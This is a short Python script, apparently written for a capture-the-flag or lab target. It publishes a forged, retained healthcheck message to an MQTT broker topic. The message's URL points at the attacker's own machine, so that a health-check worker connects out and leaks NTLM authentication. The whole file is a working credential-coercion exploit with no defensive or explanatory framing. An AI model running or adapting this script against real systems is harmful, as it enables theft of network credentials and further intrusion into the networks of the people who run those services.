#!/usr/bin/env python3
"""Ghostlink MQTT helper - read/publish the secureshare healthcheck topic
to coerce NTLM authentication from the health-check worker."""
import sys, json, time
import paho.mqtt.client as mqtt

BROKER = "10.129.62.59"
PORT = 1883
TOPIC = "GhostProtocolZero/systems/node/secureshare/healthcheck"

def build_payload(target_url):
    """Build a healthcheck telemetry payload pointing the URL at our box."""
    msg = {
        "timestamp": "2026-08-13-13:00:00",
        "node": "node-6",
        "telemetry": {
            "healthy": True,
            "url": target_url,
            "lastCheckSecAgo": 1,
            "responseCode": "200",
            "ip": "172.16.20.10",
        },
    }
    return json.dumps(msg)

def publish(url, retain=True):
    c = mqtt.Client()
    c.connect(BROKER, PORT, 60)
    c.loop_start()
    payload = build_payload(url)
    c.publish(TOPIC, payload, qos=1, retain=retain)
    time.sleep(1)
    c.loop_stop()
    c.disconnect()
    print(f"[+] published to {TOPIC}: {payload}")

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://10.10.15.187/"
    publish(url)
